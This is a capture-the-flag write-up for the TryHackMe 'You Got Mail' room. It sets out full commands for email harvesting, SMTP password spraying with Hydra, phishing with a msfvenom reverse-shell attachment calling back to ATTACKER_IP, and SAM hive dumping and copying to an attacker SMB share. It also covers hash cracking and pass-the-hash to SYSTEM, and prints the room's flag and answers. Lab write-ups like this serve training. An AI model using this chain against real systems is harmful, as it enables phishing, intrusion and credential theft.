# TryHackMe: You Got Mail — Writeup

**Platform:** TryHackMe  
**Room:** [You Got Mail](https://tryhackme.com/room/yougotmail)  
**Difficulty:** Medium  
**OS:** Windows Server 2019  
**Tags:** OSINT, Phishing, SMTP, Post-Exploitation, Hash Cracking, Pass-the-Hash

---

## Scenario

You are a penetration tester requested to perform a security assessment for **Brik**. You are permitted to perform active assessments on the target machine IP and strictly passive reconnaissance on `brownbrick.co`. The scope includes only the domain and IP provided.

---

## 1. Reconnaissance

### 1.1 Host Configuration

Before starting, I added the target IP to `/etc/hosts` to ensure proper domain resolution:

```bash
echo '<TARGET_IP> brownbrick.co ygm.thm' | sudo tee -a /etc/hosts
```

### 1.2 Nmap Scan

Full port scan with service and script detection:

```bash
nmap -sC -sV -p- -T4 <TARGET_IP> -oN yougotmail_nmap.txt
```

**Key findings:**

| Port | Service | Details |
|------|---------|---------|
| 25 | SMTP | hMailServer smtpd (AUTH LOGIN supported) |
| 110 | POP3 | hMailServer pop3d |
| 143 | IMAP | hMailServer imapd |
| 445 | SMB | Signing enabled but not required |
| 587 | SMTP | hMailServer smtpd (submission, AUTH LOGIN) |
| 3389 | RDP | Microsoft Terminal Services |
| 5985 | WinRM | Microsoft HTTPAPI |

Additional details from RDP NTLM info:
- **Hostname:** BRICK-MAIL
- **OS Build:** 10.0.17763 (Windows Server 2019)

No web server (80/443) was found on the target machine — the `brownbrick.co` website is hosted externally.

### 1.3 Passive Reconnaissance — Website Enumeration

Browsing the `brownbrick.co` website, I navigated to the **Our Team** page (`/menu.html`) and discovered six employee profiles with email addresses (obfuscated via Cloudflare email protection, decoded via browser):

| Name | Email |
|------|-------|
| Omar Aurelius | oaurelius@brownbrick.co |
| Winifred Rohit | wrohit@brownbrick.co |
| Laird Hedvig | lhedvig@brownbrick.co |
| Titus Chikondi | tchikondi@brownbrick.co |
| Pontos Cathrine | pcathrine@brownbrick.co |
| Filimena Stamatis | fstamatis@brownbrick.co |

Email naming convention: `first_initial + lastname@brownbrick.co`

I saved all addresses to `emails.txt` for later use.

---

## 2. Initial Access

### 2.1 Building a Custom Wordlist

Since `cewl` was unavailable due to dependency issues, I manually created a password wordlist from words found on the company website — brand names, keywords, employee names, and the founding year:

```bash
cat << 'EOF' > passwords.txt
BRIK
Brik
brik
Brick
brick
Bricks
bricks
Brown
brown
BrownBrick
brownbrick
Fresh
Organic
Serving
Street
York
Domain
Aurelius
Rohit
Hedvig
Chikondi
Cathrine
Stamatis
Omar
Winifred
Laird
Titus
Pontos
Filimena
1950
EOF
```

### 2.2 SMTP Password Spraying

Using Hydra against the SMTP submission port (587) with AUTH LOGIN:

```bash
hydra -L emails.txt -P passwords.txt <TARGET_IP> smtp -s 587 -t 4
```

**Result:**

```
[587][smtp] host: <TARGET_IP>   login: lhedvig@brownbrick.co   password: bricks
```

Valid credentials found: `lhedvig@brownbrick.co` / `bricks`

### 2.3 Phishing Attack

With access to a legitimate internal email account, the next step was to send phishing emails with a malicious attachment to other employees.

**Step 1 — Generate a reverse shell payload:**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o payload.exe
```

**Step 2 — Start a listener:**

```bash
nc -lvnp 4444
```

**Step 3 — Send phishing emails using swaks:**

```bash
for email in oaurelius@brownbrick.co wrohit@brownbrick.co tchikondi@brownbrick.co pcathrine@brownbrick.co fstamatis@brownbrick.co; do
  swaks --to "$email" \
        --from lhedvig@brownbrick.co \
        --header "Subject: Important Update" \
        --body "Please review the attached document" \
        --attach payload.exe \
        --server <TARGET_IP> --port 587 \
        --auth LOGIN \
        --auth-user lhedvig@brownbrick.co \
        --auth-password bricks
done
```

After approximately one minute, a reverse shell was received:

```
Connection received on <TARGET_IP> 49891
Microsoft Windows [Version 10.0.17763.1821]
C:\Mail\Attachments>
```

---

## 3. Post-Exploitation

### 3.1 User Enumeration

```cmd
whoami
brick-mail\wrohit

whoami /all
```

**Key findings:**
- **User:** `brick-mail\wrohit` (Winifred Rohit opened the attachment)
- **Group:** `BUILTIN\Administrators` — local admin privileges
- **Integrity Level:** High Mandatory Level
- **Notable Privileges:**
  - `SeDebugPrivilege` — Enabled (process injection, memory dumping)
  - `SeImpersonatePrivilege` — Enabled (token impersonation)

No privilege escalation was necessary — wrohit is already a local administrator.

### 3.2 Flag #1

```cmd
type C:\Users\wrohit\Desktop\flag.txt
THM{l1v1n_7h3_br1ck_l1f3}
```

### 3.3 hMailServer Administrator Password

The hMailServer configuration file stores the administrator password hash:

```cmd
type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
```

Relevant section:

```ini
[Security]
AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
```

Cracking the MD5 hash with hashcat:

```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `5f4dcc3b5aa765d61d8327deb882cf99` → **`password`**

### 3.4 Dumping SAM Database

To extract the password for wrohit's Windows account, I dumped the SAM and SYSTEM registry hives:

```cmd
reg save HKLM\SAM C:\Users\wrohit\sam
reg save HKLM\SYSTEM C:\Users\wrohit\system
```

**Transferring files via SMB:**

On the attacker machine, I set up an authenticated SMB server:

```bash
python3 /opt/impacket/examples/smbserver.py share /root -smb2support -username test -password test
```

On the target:

```cmd
net use \\<ATTACKER_IP>\share /user:test test
copy C:\Users\wrohit\sam \\<ATTACKER_IP>\share\sam
copy C:\Users\wrohit\system \\<ATTACKER_IP>\share\system
```

**Extracting hashes with secretsdump:**

```bash
python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL
```

**Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
wrohit:1014:aad3b435b51404eeaad3b435b51404ee:8458995f1d0a4b0c107fb8e23362c814:::
fstamatis:1009:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
lhedvig:1010:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
oaurelius:1011:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
pcathrine:1012:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
tchikondi:1013:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
```

Interesting observation: all employees (except wrohit) share the same NTLM hash `034c830cc313485a82e57a0d9dfa14e4`.

### 3.5 Cracking wrohit's NTLM Hash

```bash
echo '8458995f1d0a4b0c107fb8e23362c814' > wrohit_hash.txt
hashcat -m 1000 wrohit_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `8458995f1d0a4b0c107fb8e23362c814` → **`superstar`**

### 3.6 Pass-the-Hash — SYSTEM Shell

The Administrator NTLM hash (`2dfe3378335d43f9764e581b856a662a`) was not found in rockyou.txt. However, using Impacket's psexec with pass-the-hash, I obtained a SYSTEM shell without cracking the password:

```bash
python3 /opt/impacket/examples/psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a \
  Administrator@<TARGET_IP>
```

```
[*] Requesting shares on <TARGET_IP>.....
[*] Found writable share ADMIN$
[*] Uploading file nfKLKoCD.exe
[*] Creating service DoEW on <TARGET_IP>.....
[*] Starting service DoEW.....
Microsoft Windows [Version 10.0.17763.1821]
C:\Windows\system32> whoami
nt authority\system
```

---

## Answers

| Question | Answer |
|----------|--------|
| Flag on wrohit's Desktop | `THM{l1v1n_7h3_br1ck_l1f3}` |
| Password of user wrohit | `superstar` |
| hMailServer Administrator password | `password` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| Hydra | SMTP password spraying |
| msfvenom | Reverse shell payload generation |
| swaks | Sending phishing emails via SMTP |
| netcat (nc) | Reverse shell listener |
| Impacket (smbserver) | SMB file transfer |
| Impacket (secretsdump) | SAM hash extraction |
| Impacket (psexec) | Pass-the-hash for SYSTEM shell |
| hashcat | MD5 and NTLM hash cracking |

---

## Attack Chain Summary

```
OSINT (email harvesting from website)
    ↓
Password Spraying (Hydra → SMTP credentials)
    ↓
Phishing (swaks + reverse shell attachment)
    ↓
Initial Access (shell as wrohit — local admin)
    ↓
Post-Exploitation (SAM dump, hash cracking, hMailServer config)
    ↓
Pass-the-Hash (psexec → NT AUTHORITY\SYSTEM)
```

---

## Key Takeaways

1. **Corporate websites are goldmines** — employee names, emails, and even potential passwords can be harvested from public-facing pages.
2. **Custom wordlists beat generic ones** — a targeted wordlist built from the company's own content found the password that rockyou.txt might have missed.
3. **Internal phishing is devastating** — a compromised internal email account has far more credibility than an external attacker sending cold emails.
4. **Local admin = game over** — with admin privileges, dumping SAM hashes and performing pass-the-hash is trivial.
5. **You don't always need to crack a hash** — pass-the-hash with psexec bypasses the need to recover the plaintext password entirely.
